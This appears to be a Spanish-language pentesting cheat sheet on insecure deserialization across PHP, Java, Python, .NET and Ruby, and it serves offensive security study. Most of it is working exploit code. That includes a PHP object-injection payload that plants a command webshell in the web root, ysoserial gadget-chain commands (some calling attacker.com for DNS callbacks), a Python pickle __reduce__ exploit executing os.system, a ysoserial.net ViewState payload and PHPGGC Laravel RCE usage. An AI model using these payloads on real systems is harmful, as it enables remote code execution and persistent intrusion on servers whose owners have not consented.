---
tags: [web, deserializacion, rce]
status: done
---

# Deserialización

---

## Concepto

El objeto serializado (Java, PHP, .NET, Python...) se deserializa en el servidor sin validar → si se puede modificar el objeto → RCE en muchos casos.

---

## Identificación por Lenguaje

```
Java:   rO0AB...  (base64 de AC ED 00 05 en hex)
        Content-Type: application/x-java-serialized-object
PHP:    O:4:"User":1:{s:4:"name";s:5:"admin";}
.NET:   AAEAAAD...  (base64 de 00 01 00 00 00)
Python: \x80\x04\x95  (pickle)
Ruby:   BAhZ...  (base64)
```

---

## PHP Object Injection

```php
// Clase con método mágico vulnerable
class Logger {
    public $log_file;
    public $data;
    
    function __destruct() {
        file_put_contents($this->log_file, $this->data);
    }
}

// Payload: escribir webshell
$obj = new Logger();
$obj->log_file = '/var/www/html/shell.php';
$obj->data = '<?php system($_GET["cmd"]); ?>';

echo serialize($obj);
// → O:6:"Logger":2:{s:8:"log_file";s:28:"/var/www/html/shell.php";s:4:"data";s:30:"<?php system($_GET["cmd"]); ?>";}
```

```php
// Magic methods peligrosos
__destruct()   → al destruir objeto
__wakeup()     → al deserializar
__toString()   → al convertir a string
__call()       → al llamar método inexistente
```

---

## Java Deserialización

```bash
# ysoserial — genera payloads de deserialización Java
# Requiere conocer las librerías disponibles en el classpath del servidor

# Gadget chains comunes
java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0
java -jar ysoserial.jar Spring1 'id' | base64 -w0
java -jar ysoserial.jar URLDNS 'http://attacker.com' | base64 -w0

# URLDNS → solo hace DNS lookup → útil para detectar sin RCE
java -jar ysoserial.jar URLDNS 'http://attacker.collaborate.net' | base64 -w0
```

---

## Python Pickle

```python
# Pickle es peligroso por diseño: __reduce__ ejecuta código al deserializar
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())

# Si el servidor deserializa pickle con el payload → RCE
```

---

## .NET ViewState

```bash
# ViewState de ASP.NET sin MAC (Message Authentication Code) → modificable
# Con clave conocida → también explotable

# ysoserial.net — payloads .NET
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami > C:\inetpub\wwwroot\out.txt" --generator=XXXX --viewstateuserkey=XXXX --decryptionalg=AES --decryptionkey=XXXX --validationalg=SHA1 --validationkey=XXXX
```

---

## Herramientas

```bash
# ysoserial (Java)
java -jar ysoserial.jar [GadgetChain] '[comando]'

# ysoserial.net (.NET)
ysoserial.exe -g [GadgetChain] -f [Formatter] -c "[comando]"

# PHPGGC — PHP gadget chains
php phpggc/phpggc --list           # listar gadget chains disponibles
php phpggc/phpggc Laravel/RCE1 system id | base64

# Burp Extension: Java Deserialization Scanner
# Detecta automáticamente Java deserialization y prueba gadget chains
```

